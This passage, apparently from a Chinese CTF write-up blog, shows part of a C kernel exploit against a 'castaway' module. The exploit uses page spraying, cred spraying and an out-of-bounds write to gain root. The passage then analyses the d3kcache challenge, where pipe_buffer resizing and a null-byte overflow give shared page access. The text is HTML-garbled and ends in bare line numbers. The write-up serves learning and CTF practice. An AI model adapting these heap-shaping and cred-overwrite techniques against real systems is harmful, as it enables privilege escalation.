class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> page_request));</span><br><span class="line">    read(cmd_pipe_reply[<span class="number">0</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">free_page</span><span class="params">(<span class="type">int</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page_request</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .cmd = CMD_FREE_PAGE,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    write(cmd_pipe_req[<span class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    read(cmd_pipe_reply[<span class="number">0</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray_cmd_handler</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page_request</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="type">int</span> socket_fd[PGV_PAGE_NUM];</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* create an isolate namespace*/</span></span><br><span class="line">    unshare_setup();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* handler request */</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        read(cmd_pipe_req[<span class="number">0</span>], &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (req.cmd == CMD_ALLOC_PAGE) &#123;</span><br><span class="line">            ret = create_socket_and_alloc_pages(<span class="number">0x1000</span>, <span class="number">1</span>);</span><br><span class="line">            socket_fd[req.idx] = ret;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (req.cmd == CMD_FREE_PAGE) &#123;</span><br><span class="line">            ret = close(socket_fd[req.idx]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] invalid request: %d\n&quot;</span>, req.cmd);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        write(cmd_pipe_reply[<span class="number">1</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line">    &#125; <span class="keyword">while</span> (req.cmd != CMD_EXIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> aragc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line">    <span class="type">char</span> th_stack[<span class="number">0x1000</span>], buf[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* to run the exp on the specific core only */</span></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/castaway&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (dev_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to open castaway device!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* use a new process for page spraying */</span></span><br><span class="line">    pipe(cmd_pipe_req);</span><br><span class="line">    pipe(cmd_pipe_reply);</span><br><span class="line">    <span class="keyword">if</span> (!fork()) &#123;</span><br><span class="line">        spray_cmd_handler();</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* make buddy&#x27;s lower order clean, castaway_requesting from higher */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spraying pgv pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PGV_PAGE_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(alloc_page(i) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at no.%d socket\n&quot;</span>, i);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to spray pages via socket!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* free pages for cred */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] freeing for cred pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; PGV_PAGE_NUM; i += <span class="number">2</span>)&#123;</span><br><span class="line">        free_page(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* spray cred to get the isolate pages we released before */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spraying cred...&quot;</span>);</span><br><span class="line">    pipe(check_root_pipe);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; CRED_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (simple_clone(CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND, </span><br><span class="line">                         waiting_for_root_fn) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at cloning %d child\n&quot;</span>, i);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to clone()!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* free pages for our vulerable objects */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] freeing for vulnerable pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PGV_PAGE_NUM; i += <span class="number">2</span>)&#123;</span><br><span class="line">        free_page(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* spray vulnerable objects, hope that we can make an oob-write to cred */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigerring vulnerability in castaway kernel module...&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">    *(<span class="type">uint32_t</span>*) &amp;buf[VUL_OBJ_SIZE - <span class="number">6</span>] = <span class="number">1</span>;    <span class="comment">/* cred-&gt;usage */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; VUL_OBJ_NUM; i++) &#123;</span><br><span class="line">        alloc();</span><br><span class="line">        edit(i, VUL_OBJ_SIZE, buf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* checking privilege in child processes */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] notifying child processes and waiting...&quot;</span>);</span><br><span class="line">    write(check_root_pipe[<span class="number">1</span>], buf, CRED_SPRAY_NUM);</span><br><span class="line">    sleep(<span class="number">1145141919</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与用户态能够较为精准的控制我们所需要的数据结构不同</p><p>内核态要复杂的多,其中存在着大量的噪声操作干扰我们的控制,因此无法做到准确的控制</p><p>因此在内核态的利用中,我们需要大量地重复某一个操作,以希望其中某一个能够成功命中</p><h1 id="D-3CTF2023-d3kcache"><a href="#D-3CTF2023-d3kcache" class="headerlink" title="D^3CTF2023 - d3kcache"></a>D^3CTF2023 - d3kcache</h1><p>文件系统是ext4,解压出来后发现没有init脚本</p><p>对文件系统不太了解,先不管了</p><p>启动脚本可以看到开启了kaslr,kpti,smap,smep默认应该也是开启的</p><h2 id="fcntl-F-SETPIPE-SZ"><a href="#fcntl-F-SETPIPE-SZ" class="headerlink" title="fcntl(F_SETPIPE_SZ)"></a>fcntl(F_SETPIPE_SZ)</h2><p>之前一直感到疑惑pipe_buffer结构体大小只有<code>0x28</code>,为什么是从<code>kmalloc-cg-1k</code>获得object</p><p>注意到pipe_buffer的分配过程中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> pipe_inode_info *<span class="title function_">alloc_pipe_info</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> pipe_bufs = PIPE_DEF_BUFFERS;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span> =</span> get_current_user();</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_bufs;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> max_size = READ_ONCE(pipe_max_size);</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer),</span><br><span class="line">     GFP_KERNEL_ACCOUNT);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pipe-&gt;bufs) &#123;</span><br><span class="line">init_waitqueue_head(&amp;pipe-&gt;wait);</span><br><span class="line">pipe-&gt;r_counter = pipe-&gt;w_counter = <span class="number">1</span>;</span><br><span class="line">pipe-&gt;buffers = pipe_bufs;</span><br><span class="line">pipe-&gt;user = user;</span><br><span class="line">mutex_init(&amp;pipe-&gt;mutex);</span><br><span class="line"><span class="keyword">return</span> pipe;</span><br><span class="line">&#125;</span><br><span class="line">....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>pipe-&gt;bufs实际上是一个pipe_buffer结构体数组,其默认会分配<code>PIPE_DEF_BUFFERS(其值默认为16)</code>个pipe_buffer</p><p>大小为640,故属于<code>kmalloc-cg-1k</code></p><p>存在一个系统调用fcntl</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">pipe_fcntl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line">    <span class="type">long</span> ret;</span><br><span class="line"></span><br><span class="line">    pipe = get_pipe_info(file, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (!pipe)</span><br><span class="line">        <span class="keyword">return</span> -EBADF;</span><br><span class="line"></span><br><span class="line">    __pipe_lock(pipe);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> F_SETPIPE_SZ:</span><br><span class="line">        ret = pipe_set_size(pipe, arg);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">pipe_set_size</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> size, nr_pages;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_bufs;</span><br><span class="line"><span class="type">long</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">size = round_pipe_size(arg);</span><br><span class="line">nr_pages = size &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!nr_pages)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If trying to increase the pipe capacity, check that an</span></span><br><span class="line"><span class="comment"> * unprivileged user is not trying to exceed various limits</span></span><br><span class="line"><span class="comment"> * (soft limit check here, hard limit check just below).</span></span><br><span class="line"><span class="comment"> * Decreasing the pipe capacity is always permitted, even</span></span><br><span class="line"><span class="comment"> * if the user is currently over a limit.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (nr_pages &gt; pipe-&gt;buffers &amp;&amp;</span><br><span class="line">size &gt; pipe_max_size &amp;&amp; !capable(CAP_SYS_RESOURCE))</span><br><span class="line"><span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">user_bufs = account_pipe_buffers(pipe-&gt;user, pipe-&gt;buffers, nr_pages);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nr_pages &gt; pipe-&gt;buffers &amp;&amp;</span><br><span class="line">(too_many_pipe_buffers_hard(user_bufs) ||</span><br><span class="line"> too_many_pipe_buffers_soft(user_bufs)) &amp;&amp;</span><br><span class="line">is_unprivileged_user()) &#123;</span><br><span class="line">ret = -EPERM;</span><br><span class="line"><span class="keyword">goto</span> out_revert_acct;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We can shrink the pipe, if arg &gt;= pipe-&gt;nrbufs. Since we don&#x27;t</span></span><br><span class="line"><span class="comment"> * expect a lot of shrink+grow operations, just free and allocate</span></span><br><span class="line"><span class="comment"> * again like we would do for growing. If the pipe currently</span></span><br><span class="line"><span class="comment"> * contains more buffers than arg, then return busy.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (nr_pages &lt; pipe-&gt;nrbufs) &#123;</span><br><span class="line">ret = -EBUSY;</span><br><span class="line"><span class="keyword">goto</span> out_revert_acct;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bufs = kcalloc(nr_pages, <span class="keyword">sizeof</span>(*bufs),</span><br><span class="line">       GFP_KERNEL_ACCOUNT | __GFP_NOWARN);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!bufs)) &#123;</span><br><span class="line">ret = -ENOMEM;</span><br><span class="line"><span class="keyword">goto</span> out_revert_acct;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The pipe array wraps around, so just start the new one at zero</span></span><br><span class="line"><span class="comment"> * and adjust the indexes.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (pipe-&gt;nrbufs) &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> tail;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> head;</span><br><span class="line"></span><br><span class="line">tail = pipe-&gt;curbuf + pipe-&gt;nrbufs;</span><br><span class="line"><span class="keyword">if</span> (tail &lt; pipe-&gt;buffers)</span><br><span class="line">tail = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">tail &amp;= (pipe-&gt;buffers - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">head = pipe-&gt;nrbufs - tail;</span><br><span class="line"><span class="keyword">if</span> (head)</span><br><span class="line"><span class="built_in">memcpy</span>(bufs, pipe-&gt;bufs + pipe-&gt;curbuf, head * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line"><span class="keyword">if</span> (tail)</span><br><span class="line"><span class="built_in">memcpy</span>(bufs + head, pipe-&gt;bufs, tail * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pipe-&gt;curbuf = <span class="number">0</span>;</span><br><span class="line">kfree(pipe-&gt;bufs);</span><br><span class="line">pipe-&gt;bufs = bufs;</span><br><span class="line">pipe-&gt;buffers = nr_pages;</span><br><span class="line"><span class="keyword">return</span> nr_pages * PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">out_revert_acct:</span><br><span class="line">(<span class="type">void</span>) account_pipe_buffers(pipe-&gt;user, nr_pages, pipe-&gt;buffers);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当选项为<code>F_SETPIPE_SZ</code></p><p>其会修改当前pipe的bufs数组大小为第三个参数(arg&gt;&gt;12)*sizeof(*bufs)</p><p>例如当我们使用<code>fcntl(pipe_fd, F_SETPIPE_SZ, 0x1000 * 64)</code>时</p><p>就会更改bufs从<code>kmalloc-cg-2k</code>进行分配</p><h2 id="模块分析"><a href="#模块分析" class="headerlink" title="模块分析"></a>模块分析</h2><p>在模块初始化的时候创建了一个kmem_cache,大小为2048,并且开启了SLAB_ACCOUNT标志位</p><p>自定义的 ioctl 函数提供了分配、追加编辑、释放、读取的一个堆菜单，漏洞便出在追加编辑当中，当写满 2048 字节时存在着一个 <code>\0</code> 字节的溢出：</p><p>目标是利用这一个零字节的溢出修改<code>pipe_buffer</code>结构体page指针,使得两个<code>pipe_buffer</code>指向同一个<code>struct page</code>,进而使得两个<code>pipe_buffer</code>使用同一个物理页框</p><p>arttnba3大佬在该利用基础上提供了三种解题方法</p><p>一千多行的<strong>exp:</strong>理解有点困难,暂时先放一放</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span 